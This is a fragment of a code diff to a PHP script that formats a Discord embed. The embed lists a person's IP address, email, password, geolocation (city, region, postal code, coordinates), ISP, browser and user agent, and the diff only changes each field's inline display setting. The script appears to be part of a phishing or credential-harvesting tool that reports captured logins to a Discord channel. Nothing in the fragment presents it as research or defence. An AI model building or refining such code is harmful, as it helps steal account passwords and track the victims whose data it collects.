@@ -189,63 +189,63 @@
                 [
                     "name" => "IP address:",
                     "value" => "`". $embed_ip. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Email:",
                     "value" => "`". $embed_email. "`",
 		    "url" => "discord.com",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Password:",
                     "value" => "`". $embed_password. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "City",
                     "value" => "`". $embed_city. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Region:",
                     "value" => "`". $embed_region. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Country:",
                     "value" => "`". $embed_country. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Postal code",
                     "value" => "`". $embed_postal. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Latitude:",
                     "value" => "`". $embed_latitude. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Longitude:",
                     "value" => "`". $embed_longitude. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Fuseau horaire:",
                     "value" => "`". $embed_timezone. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Languages:",
                     "value" => "`". $embed_languages. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Europe:",
                     "value" => "`". $embed_europe. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "ASN",
@@ -255,12 +255,12 @@
                 [
                     "name" => "ISP:",
                     "value" => "`". $embed_isp. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "Browser:",
                     "value" => "`". $embed_browser. "`",
-                    "inline" => false
+                    "inline" => true
                 ],
                 [
                     "name" => "User agent:",
